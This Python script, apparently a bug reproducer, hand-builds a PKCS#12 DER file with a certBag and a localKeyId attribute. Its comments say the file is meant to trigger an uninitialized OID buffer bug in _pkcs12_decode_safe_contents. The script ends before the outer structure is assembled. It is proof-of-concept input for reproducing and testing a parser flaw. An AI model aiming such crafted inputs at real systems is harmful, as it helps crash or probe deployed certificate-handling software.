# Build minimal PKCS#12 DER that exercises _pkcs12_decode_safe_contents with bagAttributes
# This should trigger the uninitialized oid buffer bug

import struct

def der_len(n):
    if n < 0x80:
        return bytes([n])
    elif n < 0x100:
        return bytes([0x81, n])
    elif n < 0x10000:
        return bytes([0x82, n >> 8, n & 0xff])
    else:
        raise ValueError("too big")

def tlv(tag, value):
    if isinstance(value, str):
        value = value.encode()
    return bytes([tag]) + der_len(len(value)) + bytes(value)

def seq(*items):
    body = b''.join(items)
    return tlv(0x30, body)

def set_(*items):
    body = b''.join(items)
    return tlv(0x31, body)

def oid_encode(dotted):
    parts = [int(x) for x in dotted.split('.')]
    body = [parts[0]*40 + parts[1]]
    for part in parts[2:]:
        if part == 0:
            body.append(0)
        else:
            enc = []
            while part:
                enc.append(part & 0x7f)
                part >>= 7
            enc.reverse()
            for i, b in enumerate(enc):
                if i < len(enc)-1:
                    body.append(b | 0x80)
                else:
                    body.append(b)
    return tlv(0x06, bytes(body))

def explicit(tag_n, value):
    body = value if isinstance(value, bytes) else bytes(value)
    tag = 0xa0 | tag_n
    return bytes([tag]) + der_len(len(body)) + body

def octet_string(data):
    return tlv(0x04, data)

def integer(n):
    return tlv(0x02, bytes([n]))

# OIDs
id_data = "1.2.840.113549.1.7.1"
bag_cert = "1.2.840.113549.1.12.10.1.3"  # certBag
oid_x509cert = "1.2.840.113549.1.9.22.1"   # x509Certificate
oid_localKeyId = "1.2.840.113549.1.9.21"   # localKeyId (KEY_ID_OID)
oid_friendlyName = "1.2.840.113549.1.9.20" # friendlyName

# A minimal dummy X.509 cert DER (just to have some content)
dummy_cert_der = seq(seq(integer(2)), seq(oid_encode("1.2.840.113549.1.1.11")))

# Build the certBag value:
# CertBag ::= SEQUENCE { certId OID, certValue [0] EXPLICIT ANY }
# The certValue is an OCTET STRING wrapping the DER cert
cert_bag_value = seq(
    oid_encode(oid_x509cert),
    explicit(0, octet_string(dummy_cert_der))
)

# Build a bagAttribute with localKeyId OID
# Attribute ::= SEQUENCE { type OID, values SET OF ANY }
local_key_id_val = octet_string(b'\x01\x02\x03\x04')
attr_localKeyId = seq(
    oid_encode(oid_localKeyId),
    set_(local_key_id_val)
)

# Build SafeBag
# SafeBag ::= SEQUENCE { bagId OID, bagValue [0] EXPLICIT ANY, bagAttributes SET OF Attribute OPTIONAL }
safe_bag = seq(
    oid_encode(bag_cert),
    explicit(0, cert_bag_value),
    set_(attr_localKeyId)
)

# SafeContents = SEQUENCE OF SafeBag
safe_contents = seq(safe_bag)

# ContentInfo for inner data: id-data, [0] OCTET STRING { safe_contents }
inner_ci = seq(
    oid_encode(id_data),
    explicit(0, octet_string(safe_contents))
)

# AuthenticatedSafe = SEQUENCE OF ContentInfo
auth_safe = seq(inner_ci)

# Outer ContentInfo: id-data, [0] OCTET STRING { auth_safe }
